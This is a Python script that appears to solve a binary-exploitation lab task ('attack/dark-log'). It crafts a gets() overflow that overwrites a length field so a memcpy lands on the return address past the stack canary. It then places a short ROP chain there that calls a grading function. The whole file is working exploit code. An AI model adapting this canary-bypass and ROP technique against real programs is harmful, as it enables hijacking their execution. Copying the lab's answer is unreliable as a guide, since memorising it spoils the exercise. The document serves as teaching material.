#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

Stack frame of input (rbp = R, 16-byte aligned):
    expression  R-0x120 (128 bytes)
    logMsg      R-0xa0  (128 bytes)
    f.len       R-0x20  (int, initialised to 0)
    canary      R-0x8
    saved rbp   R
    return addr R+8

gets() can reach f.len without touching the canary. We overwrite f.len with
0xa8 so that memcpy(logMsg + f.len, expression, 128) writes to R+8, i.e.
starting at the return address, completely skipping the canary. The first
32 bytes of expression therefore form a ROP chain copied onto R+8:

    ret; pop rdi; ret -> 4 -> grade_eval
"""
import struct
import sys

RET = 0x4018A4
POP_RDI_RET = 0x4018A3
GRADE_EVAL = 0x401677

LEN_OFFSET = 0x100  # 256: distance from expression to f.len
NEW_LEN = 0xA8      # logMsg (R-0xa0) + 0xa8 = R+8

chain = struct.pack("<Q", RET)
chain += struct.pack("<Q", POP_RDI_RET)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE_EVAL)

payload = chain
payload += b"B" * (LEN_OFFSET - len(chain))
payload += struct.pack("<I", NEW_LEN)
payload += b"\n"

sys.stdout.buffer.write(payload)
